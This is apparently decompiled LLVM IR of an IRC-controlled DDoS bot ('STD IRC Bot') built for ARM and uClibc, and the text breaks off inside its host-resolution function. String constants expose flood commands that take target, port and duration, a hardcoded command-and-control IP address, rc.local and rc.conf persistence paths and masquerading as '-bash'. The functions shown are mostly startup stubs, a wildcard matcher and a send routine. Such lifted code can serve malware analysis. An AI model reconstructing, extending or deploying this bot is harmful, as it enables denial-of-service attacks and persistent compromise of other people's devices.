source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_23100.23 = global i32 0
@global_var_a290.27 = constant i32 -509558771
@global_var_23868.32 = global i32 0
@global_var_26538.34 = global i32 0
@global_var_195b0.36 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_195d4.41 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_23464.43 = local_unnamed_addr global i32 0
@global_var_26550.45 = global i32 0
@global_var_195f4.48 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_19604.50 = constant i32 114
@global_var_2652c.54 = local_unnamed_addr global i32 0
@global_var_19608.56 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_2654c.58 = local_unnamed_addr global i32 0
@global_var_19624.60 = constant [46 x i8] c"PRIVMSG %s :>bot +std <target> <port> <secs>\0A\00"
@global_var_19654.62 = constant [30 x i8] c"PRIVMSG %s :[STD]Hitting %s!\0A\00"
@global_var_19674.64 = constant [4 x i8] c"std\00"
@global_var_19678.66 = constant [35 x i8] c"PRIVMSG %s :[STD]Done hitting %s!\0A\00"
@global_var_1969c.70 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_196bc.74 = constant [43 x i8] c"PRIVMSG %s :>bot +unknown <target> <secs>\0A\00"
@global_var_196e8.76 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_19708.78 = constant [35 x i8] c"PRIVMSG %s :[UNK]Done hitting %s!\0A\00"
@global_var_195a8.80 = constant [5 x i8] c"Fine\00"
@global_var_19748.81 = constant [5 x i8] c"+std\00"
@global_var_231c8.82 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_195a8.80, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19748.81, i32 0, i32 0)]
@global_var_1972c.85 = constant [25 x i8] c"PRIVMSG %s :Nice try...\0A\00"
@global_var_26534.88 = global i32 0
@global_var_19778.90 = constant i32 0
@global_var_231cc.92 = global [5 x i8]* @global_var_19748.81
@global_var_1977c.95 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_26548.98 = local_unnamed_addr global i32 0
@global_var_1978c.100 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1979c.102 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_197a4.104 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_23460.107 = global i32 0
@global_var_197b0.110 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_19810.118 = constant i32 0
@global_var_23454.121 = global i32 0
@global_var_231bc.123 = local_unnamed_addr global i32 1
@global_var_19598.125 = constant [14 x i8] c"178.156.202.2\00"
@global_var_231c0.126 = global [14 x i8]* @global_var_19598.125
@global_var_26540.128 = global i32 0
@global_var_19834.130 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_19848.133 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_19858.135 = constant i32 47
@global_var_1985c.137 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_19864.139 = constant i32 97
@global_var_19868.141 = constant [6 x i8] c"-bash\00"
@global_var_19870.146 = constant [4 x i8] c"STD\00"
@global_var_2653c.148 = local_unnamed_addr global i32 0
@global_var_19874.150 = constant [12 x i8] c"STD IRC Bot\00"
@global_var_19880.153 = constant i32 35
@global_var_26530.156 = local_unnamed_addr global i32 0
@global_var_19884.160 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_19890.162 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_198bc.166 = constant i32 10
@global_var_198c0.168 = constant i32 42
@global_var_19814.170 = constant [4 x i8] c"352\00"
@global_var_231f4.171 = global [4 x i8]* @global_var_19814.170
@global_var_198c4.173 = constant [6 x i8] c"ERROR\00"
@global_var_23104.179 = global i32 0
@global_var_10b94.194 = constant i32 -382910288
@global_var_d344.195 = constant i32 -382906384
@global_var_f3b8.198 = constant i32 -382909968
@global_var_bd04.226 = constant i32 -382910448
@global_var_128e4.227 = constant i32 -382909968
@global_var_129c0.228 = constant i32 -382910224
@global_var_d93c.269 = constant i32 -456978431
@global_var_23120.283 = local_unnamed_addr global i32 12
@global_var_e27c.304 = constant i32 85724
@global_var_e4b8.319 = constant i32 -478871519
@global_var_ee1c.329 = constant i32 -478805983
@global_var_10000.333 = constant i32 -509607923
@global_var_f204.340 = constant i32 -382906384
@global_var_11c1c.349 = constant i32 -442544040
@global_var_f7c4.355 = constant i32 -442564540
@global_var_101c0.412 = constant i32 -369098502
@global_var_12264.443 = constant i32 542720
@global_var_1101c.447 = constant i32 -494075872
@global_var_11f08.448 = constant i32 -382910336
@global_var_26924.451 = local_unnamed_addr global i32 0
@global_var_f634.463 = constant i32 -442543860
@global_var_d8b0.471 = constant i32 -369092638
@global_var_12064.519 = constant i32 -443088884
@global_var_10f88.524 = constant i32 436207668
@global_var_f000.526 = constant i32 -369098741
@global_var_14ca8.601 = constant i32 -382910352
@global_var_d74c.619 = constant i32 -485294072
@global_var_110a0.631 = constant i32 -450904024
@global_var_16278.638 = constant i32 -442695584
@global_var_16854.648 = constant i32 -382910224
@global_var_169bc.671 = constant i32 167772324
@global_var_c3c0.677 = constant i32 -509607925
@global_var_17854.690 = constant i32 -504313148
@global_var_1783c.691 = constant i32 -483131392
@global_var_176e8.692 = constant i32 -481229311
@global_var_178c4.693 = constant i32 -477817729
@global_var_179c4.694 = constant i32 -476034303
@global_var_17c00.695 = constant i32 -516685812
@global_var_17af4.696 = constant i32 -905969571
@global_var_17a28.697 = constant i32 -528203771
@global_var_17c88.698 = constant i32 -478079873
@global_var_17c6c.699 = constant i32 -534704125
@global_var_17c1c.700 = constant i32 -534704125
@global_var_17bb4.701 = constant i32 -483131392
@global_var_184f0.709 = constant i32 -481296376
@global_var_185e8.710 = constant i32 -481296376
@global_var_1866c.711 = constant i32 -369098732
@global_var_23438.13 = external global i8*
@global_var_23468.30 = external global i8*
@global_var_23458.38 = external local_unnamed_addr global i8*
@global_var_2345c.112 = external local_unnamed_addr global i8*
@global_var_2345f.113 = external local_unnamed_addr global i8*
@global_var_2345e.114 = external local_unnamed_addr global i8*
@global_var_2345d.115 = external local_unnamed_addr global i8*
@global_var_23164.175 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_8108 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_8108)
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_810c = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_810c)
  %v1_810c = load i32, i32* @r0, align 4
  ret i32 %v1_810c
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_8110 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_8110)
  %v1_8110 = load i32, i32* @r0, align 4
  ret i32 %v1_8110
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_8114 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_8114)
  %v1_8114 = load i32, i32* @r0, align 4
  ret i32 %v1_8114
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_8118 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_8118)
  %v1_8118 = load i32, i32* @r0, align 4
  ret i32 %v1_8118
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_811c = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_811c)
  %v1_811c = load i32, i32* @r0, align 4
  ret i32 %v1_811c
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8120 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8120)
  %v1_8120 = load i32, i32* @r0, align 4
  ret i32 %v1_8120
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8124 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8124)
  %v1_8124 = load i32, i32* @r0, align 4
  ret i32 %v1_8124
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8128 = load i32, i32* @r0, align 4
  ret i32 %v1_8128
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_812c = load i32, i32* @r4, align 4
  store i32 %v3_812c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_23438.13 to i32), i32* %r4.global-to-local, align 4
  %v2_8134 = load i8, i8* bitcast (i8** @global_var_23438.13 to i8*), align 4
  %v2_8138 = icmp eq i8 %v2_8134, 0
  br i1 %v2_8138, label %dec_label_pc_8140, label %dec_label_pc_815c

dec_label_pc_8140:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* %r4.global-to-local, align 4
  %v3_8158 = inttoptr i32 %v2_8158 to i8*
  store i8 1, i8* %v3_8158, align 1
  %v2_815c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_815c

dec_label_pc_815c:                                ; preds = %entry, %dec_label_pc_8140
  %v2_815c = phi i32 [ %v3_812c, %entry ], [ %v2_815c.pre, %dec_label_pc_8140 ]
  store i32 %v2_815c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_23438.13, { 1, 0 }
  uselistorder label %dec_label_pc_815c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8194 = load i32, i32* @global_var_23100.23, align 4
  %v2_8198 = icmp eq i32 %v2_8194, 0
  br i1 %v2_8198, label %dec_label_pc_81b0, label %dec_label_pc_81a0

dec_label_pc_81a0:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_81b0

dec_label_pc_81b0:                                ; preds = %bb, %dec_label_pc_81a0
  ret i32 ptrtoint (i32* @global_var_23100.23 to i32)

; uselistorder directives
  uselistorder i32* @global_var_23100.23, { 1, 0 }
  uselistorder label %dec_label_pc_81b0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81d8 = ptrtoint i32* %stack_var_4 to i32
  %v7_81f8 = inttoptr i32 %arg2 to i64*
  %v8_81f8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_a290.27 to i32), i64* %v7_81f8, i32 %v4_81d8, i32 32980, i32 103812, i32 %arg1, i32 %v4_81d8)
  %v0_81fc = call i32 @abort()
  ret i32 %v0_81fc
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp18 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_8210 = load i32, i32* @r4, align 4
  %v6_8210 = load i32, i32* @fp, align 4
  store i32 33304, i32* %stack_var_-4, align 4
  %v2_8214 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8214, i32* @fp, align 4
  %v2_8228 = load i8, i8* %arg1, align 1
  %v7_8234 = icmp eq i8 %v2_8228, 84
  br i1 %v7_8234, label %dec_label_pc_84f4, label %dec_label_pc_823c

dec_label_pc_823c:                                ; preds = %entry
  %v8_8244 = icmp ugt i8 %v2_8228, 84
  br i1 %v8_8244, label %dec_label_pc_828c, label %dec_label_pc_8248

dec_label_pc_8248:                                ; preds = %dec_label_pc_823c
  %v7_824c = icmp eq i8 %v2_8228, 66
  br i1 %v7_824c, label %dec_label_pc_8414, label %dec_label_pc_8254

dec_label_pc_8254:                                ; preds = %dec_label_pc_8248
  %v8_825c = icmp ugt i8 %v2_8228, 66
  br i1 %v8_825c, label %dec_label_pc_827c, label %dec_label_pc_8260

dec_label_pc_8260:                                ; preds = %dec_label_pc_8254
  %v2_8264 = icmp eq i8 %v2_8228, 0
  br i1 %v2_8264, label %dec_label_pc_82b4, label %dec_label_pc_826c

dec_label_pc_826c:                                ; preds = %dec_label_pc_8260
  %v7_8270 = icmp eq i8 %v2_8228, 63
  br i1 %v7_8270, label %dec_label_pc_8564, label %dec_label_pc_85bc

dec_label_pc_827c:                                ; preds = %dec_label_pc_8254
  %v7_8280 = icmp eq i8 %v2_8228, 79
  br i1 %v7_8280, label %dec_label_pc_8484, label %dec_label_pc_85bc

dec_label_pc_828c:                                ; preds = %dec_label_pc_823c
  %v7_8290 = icmp eq i8 %v2_8228, 111
  br i1 %v7_8290, label %dec_label_pc_8334, label %dec_label_pc_8298

dec_label_pc_8298:                                ; preds = %dec_label_pc_828c
  %v7_829c = icmp eq i8 %v2_8228, 116
  br i1 %v7_829c, label %dec_label_pc_83a4, label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8298
  %v7_82a8 = icmp eq i8 %v2_8228, 98
  br i1 %v7_82a8, label %dec_label_pc_82c4, label %dec_label_pc_85bc

dec_label_pc_82b4:                                ; preds = %dec_label_pc_8260
  %v2_82b8 = load i8, i8* %tmp, align 1
  %v3_82b8 = zext i8 %v2_82b8 to i32
  br label %dec_label_pc_8630

dec_label_pc_82c4:                                ; preds = %dec_label_pc_82a4
  %v1_82c8 = add i32 %tmp18, 1
  %v3_82d4 = inttoptr i32 %v1_82c8 to i8*
  %v4_82d4 = call i32 @strwildmatch(i8* %v3_82d4, i32 %arg2)
  %v2_82dc = icmp eq i32 %v4_82d4, 0
  br i1 %v2_82dc, label %dec_label_pc_8320, label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82c4
  %v2_82e8 = load i8, i8* %tmp, align 1
  %v2_82ec = icmp eq i8 %v2_82e8, 0
  br i1 %v2_82ec, label %dec_label_pc_8328, label %dec_label_pc_82f4

dec_label_pc_82f4:                                ; preds = %dec_label_pc_82e4
  %v1_82f8 = add i32 %arg2, 1
  %v4_8304 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_82f8)
  %v2_830c = icmp eq i32 %v4_8304, 0
  br i1 %v2_830c, label %dec_label_pc_8320, label %dec_label_pc_8328

dec_label_pc_8320:                                ; preds = %dec_label_pc_82f4, %dec_label_pc_82c4
  br label %dec_label_pc_8328

dec_label_pc_8328:                                ; preds = %dec_label_pc_82e4, %dec_label_pc_82f4, %dec_label_pc_8320
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8320 ], [ 1, %dec_label_pc_82f4 ], [ 1, %dec_label_pc_82e4 ]
  br label %dec_label_pc_8630

dec_label_pc_8334:                                ; preds = %dec_label_pc_828c
  %v1_8338 = add i32 %tmp18, 1
  %v3_8344 = inttoptr i32 %v1_8338 to i8*
  %v4_8344 = call i32 @strwildmatch(i8* %v3_8344, i32 %arg2)
  %v2_834c = icmp eq i32 %v4_8344, 0
  br i1 %v2_834c, label %dec_label_pc_8390, label %dec_label_pc_8354

dec_label_pc_8354:                                ; preds = %dec_label_pc_8334
  %v2_8358 = load i8, i8* %tmp, align 1
  %v2_835c = icmp eq i8 %v2_8358, 0
  br i1 %v2_835c, label %dec_label_pc_8398, label %dec_label_pc_8364

dec_label_pc_8364:                                ; preds = %dec_label_pc_8354
  %v1_8368 = add i32 %arg2, 1
  %v4_8374 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8368)
  %v2_837c = icmp eq i32 %v4_8374, 0
  br i1 %v2_837c, label %dec_label_pc_8390, label %dec_label_pc_8398

dec_label_pc_8390:                                ; preds = %dec_label_pc_8364, %dec_label_pc_8334
  br label %dec_label_pc_8398

dec_label_pc_8398:                                ; preds = %dec_label_pc_8354, %dec_label_pc_8364, %dec_label_pc_8390
  %storemerge7 = phi i32 [ 0, %dec_label_pc_8390 ], [ 1, %dec_label_pc_8364 ], [ 1, %dec_label_pc_8354 ]
  br label %dec_label_pc_8630

dec_label_pc_83a4:                                ; preds = %dec_label_pc_8298
  %v1_83a8 = add i32 %tmp18, 1
  %v3_83b4 = inttoptr i32 %v1_83a8 to i8*
  %v4_83b4 = call i32 @strwildmatch(i8* %v3_83b4, i32 %arg2)
  %v2_83bc = icmp eq i32 %v4_83b4, 0
  br i1 %v2_83bc, label %dec_label_pc_8400, label %dec_label_pc_83c4

dec_label_pc_83c4:                                ; preds = %dec_label_pc_83a4
  %v2_83c8 = load i8, i8* %tmp, align 1
  %v2_83cc = icmp eq i8 %v2_83c8, 0
  br i1 %v2_83cc, label %dec_label_pc_8408, label %dec_label_pc_83d4

dec_label_pc_83d4:                                ; preds = %dec_label_pc_83c4
  %v1_83d8 = add i32 %arg2, 1
  %v4_83e4 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_83d8)
  %v2_83ec = icmp eq i32 %v4_83e4, 0
  br i1 %v2_83ec, label %dec_label_pc_8400, label %dec_label_pc_8408

dec_label_pc_8400:                                ; preds = %dec_label_pc_83d4, %dec_label_pc_83a4
  br label %dec_label_pc_8408

dec_label_pc_8408:                                ; preds = %dec_label_pc_83c4, %dec_label_pc_83d4, %dec_label_pc_8400
  %storemerge6 = phi i32 [ 0, %dec_label_pc_8400 ], [ 1, %dec_label_pc_83d4 ], [ 1, %dec_label_pc_83c4 ]
  br label %dec_label_pc_8630

dec_label_pc_8414:                                ; preds = %dec_label_pc_8248
  %v1_8418 = add i32 %tmp18, 1
  %v3_8424 = inttoptr i32 %v1_8418 to i8*
  %v4_8424 = call i32 @strwildmatch(i8* %v3_8424, i32 %arg2)
  %v2_842c = icmp eq i32 %v4_8424, 0
  br i1 %v2_842c, label %dec_label_pc_8470, label %dec_label_pc_8434

dec_label_pc_8434:                                ; preds = %dec_label_pc_8414
  %v2_8438 = load i8, i8* %tmp, align 1
  %v2_843c = icmp eq i8 %v2_8438, 0
  br i1 %v2_843c, label %dec_label_pc_8478, label %dec_label_pc_8444

dec_label_pc_8444:                                ; preds = %dec_label_pc_8434
  %v1_8448 = add i32 %arg2, 1
  %v4_8454 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8448)
  %v2_845c = icmp eq i32 %v4_8454, 0
  br i1 %v2_845c, label %dec_label_pc_8470, label %dec_label_pc_8478

dec_label_pc_8470:                                ; preds = %dec_label_pc_8444, %dec_label_pc_8414
  br label %dec_label_pc_8478

dec_label_pc_8478:                                ; preds = %dec_label_pc_8434, %dec_label_pc_8444, %dec_label_pc_8470
  %storemerge4 = phi i32 [ 0, %dec_label_pc_8470 ], [ 1, %dec_label_pc_8444 ], [ 1, %dec_label_pc_8434 ]
  br label %dec_label_pc_8630

dec_label_pc_8484:                                ; preds = %dec_label_pc_827c
  %v1_8488 = add i32 %tmp18, 1
  %v3_8494 = inttoptr i32 %v1_8488 to i8*
  %v4_8494 = call i32 @strwildmatch(i8* %v3_8494, i32 %arg2)
  %v2_849c = icmp eq i32 %v4_8494, 0
  br i1 %v2_849c, label %dec_label_pc_84e0, label %dec_label_pc_84a4

dec_label_pc_84a4:                                ; preds = %dec_label_pc_8484
  %v2_84a8 = load i8, i8* %tmp, align 1
  %v2_84ac = icmp eq i8 %v2_84a8, 0
  br i1 %v2_84ac, label %dec_label_pc_84e8, label %dec_label_pc_84b4

dec_label_pc_84b4:                                ; preds = %dec_label_pc_84a4
  %v1_84b8 = add i32 %arg2, 1
  %v4_84c4 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_84b8)
  %v2_84cc = icmp eq i32 %v4_84c4, 0
  br i1 %v2_84cc, label %dec_label_pc_84e0, label %dec_label_pc_84e8

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84b4, %dec_label_pc_8484
  br label %dec_label_pc_84e8

dec_label_pc_84e8:                                ; preds = %dec_label_pc_84a4, %dec_label_pc_84b4, %dec_label_pc_84e0
  %storemerge3 = phi i32 [ 0, %dec_label_pc_84e0 ], [ 1, %dec_label_pc_84b4 ], [ 1, %dec_label_pc_84a4 ]
  br label %dec_label_pc_8630

dec_label_pc_84f4:                                ; preds = %entry
  %v1_84f8 = add i32 %tmp18, 1
  %v3_8504 = inttoptr i32 %v1_84f8 to i8*
  %v4_8504 = call i32 @strwildmatch(i8* %v3_8504, i32 %arg2)
  %v2_850c = icmp eq i32 %v4_8504, 0
  br i1 %v2_850c, label %dec_label_pc_8550, label %dec_label_pc_8514

dec_label_pc_8514:                                ; preds = %dec_label_pc_84f4
  %v2_8518 = load i8, i8* %tmp, align 1
  %v2_851c = icmp eq i8 %v2_8518, 0
  br i1 %v2_851c, label %dec_label_pc_8558, label %dec_label_pc_8524

dec_label_pc_8524:                                ; preds = %dec_label_pc_8514
  %v1_8528 = add i32 %arg2, 1
  %v4_8534 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8528)
  %v2_853c = icmp eq i32 %v4_8534, 0
  br i1 %v2_853c, label %dec_label_pc_8550, label %dec_label_pc_8558

dec_label_pc_8550:                                ; preds = %dec_label_pc_8524, %dec_label_pc_84f4
  br label %dec_label_pc_8558

dec_label_pc_8558:                                ; preds = %dec_label_pc_8514, %dec_label_pc_8524, %dec_label_pc_8550
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8550 ], [ 1, %dec_label_pc_8524 ], [ 1, %dec_label_pc_8514 ]
  br label %dec_label_pc_8630

dec_label_pc_8564:                                ; preds = %dec_label_pc_826c
  %v2_8568 = load i8, i8* %tmp, align 1
  %v2_856c = icmp eq i8 %v2_8568, 0
  br i1 %v2_856c, label %dec_label_pc_85b0, label %dec_label_pc_8574

dec_label_pc_8574:                                ; preds = %dec_label_pc_8564
  %v1_8578 = add i32 %tmp18, 1
  %v1_8580 = add i32 %arg2, 1
  %v2_858c = inttoptr i32 %v1_8578 to i8*
  %v3_858c = call i32 @strwildmatch(i8* %v2_858c, i32 %v1_8580)
  %v2_8594 = icmp ne i32 %v3_858c, 0
  %. = zext i1 %v2_8594 to i32
  br label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %dec_label_pc_8574, %dec_label_pc_8564
  %storemerge2 = phi i32 [ 1, %dec_label_pc_8564 ], [ %., %dec_label_pc_8574 ]
  br label %dec_label_pc_8630

dec_label_pc_85bc:                                ; preds = %dec_label_pc_82a4, %dec_label_pc_827c, %dec_label_pc_826c
  %v2_85c0 = load i8, i8* %arg1, align 1
  %v3_85c0 = zext i8 %v2_85c0 to i32
  %v1_85c8 = call i32 @__GI_toupper(i32 %v3_85c0)
  store i32 %v1_85c8, i32* @r4, align 4
  %v2_85d4 = load i8, i8* %tmp, align 1
  %v3_85d4 = zext i8 %v2_85d4 to i32
  %v1_85dc = call i32 @__GI_toupper(i32 %v3_85d4)
  %v0_85e4 = load i32, i32* @r4, align 4
  %v9_85e4 = icmp eq i32 %v0_85e4, %v1_85dc
  br i1 %v9_85e4, label %dec_label_pc_85ec, label %dec_label_pc_8628

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85bc
  %v1_85f0 = add i32 %tmp18, 1
  %v1_85f8 = add i32 %arg2, 1
  %v2_8604 = inttoptr i32 %v1_85f0 to i8*
  %v3_8604 = call i32 @strwildmatch(i8* %v2_8604, i32 %v1_85f8)
  %v2_860c = icmp ne i32 %v3_8604, 0
  %.17 = zext i1 %v2_860c to i32
  br label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_85bc
  %storemerge = phi i32 [ 1, %dec_label_pc_85bc ], [ %.17, %dec_label_pc_85ec ]
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_8558, %dec_label_pc_84e8, %dec_label_pc_8478, %dec_label_pc_8408, %dec_label_pc_8398, %dec_label_pc_8328, %dec_label_pc_82b4, %dec_label_pc_8628
  %stack_var_-68.0 = phi i32 [ %storemerge8, %dec_label_pc_8558 ], [ %storemerge7, %dec_label_pc_8398 ], [ %storemerge6, %dec_label_pc_8408 ], [ %storemerge5, %dec_label_pc_8328 ], [ %storemerge, %dec_label_pc_8628 ], [ %storemerge4, %dec_label_pc_8478 ], [ %storemerge3, %dec_label_pc_84e8 ], [ %v3_82b8, %dec_label_pc_82b4 ], [ %storemerge2, %dec_label_pc_85b0 ]
  store i32 %v3_8210, i32* @r4, align 4
  store i32 %v6_8210, i32* @fp, align 4
  ret i32 %stack_var_-68.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp18, { 3, 0, 7, 1, 2, 5, 6, 4 }
  uselistorder i8* %tmp, { 4, 0, 8, 2, 3, 6, 7, 5, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 13, 12, 0, 1, 10, 11, 8, 9, 4, 5, 2, 3, 6, 7, 14 }
  uselistorder i8* %arg1, { 2, 6, 0, 1, 4, 5, 3, 7, 8 }
  uselistorder label %dec_label_pc_8630, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_8558, { 2, 1, 0 }
  uselistorder label %dec_label_pc_84e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8478, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8408, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8398, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8328, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_864c = load i32, i32* @fp, align 4
  store i32 34388, i32* %stack_var_-16, align 4
  %v2_8650 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8650, i32* @fp, align 4
  %v4_8660 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i8** @global_var_23468.30 to i32), i32* @r0, align 4
  %v4_8674 = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_23468.30 to i32), i32 %arg2, i32 %v4_8660)
  %v3_867c = call i32 @strlen(i8* bitcast (i8** @global_var_23468.30 to i8*))
  store i32 %v3_867c, i32* @r3, align 4
  store i32 %v3_867c, i32* @r2, align 4
  %v3_8690 = call i32 @__GI___libc_write(i32 %arg1, i32 ptrtoint (i8** @global_var_23468.30 to i32))
  store i32 %v3_864c, i32* @fp, align 4
  ret i32 %v3_8690

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_23468.30 to i32), { 1, 0, 2 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_86b0 = load i32, i32* @fp, align 4
  store i32 34488, i32* %stack_var_-4, align 4
  %v2_86b4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_86b4, i32* @fp, align 4
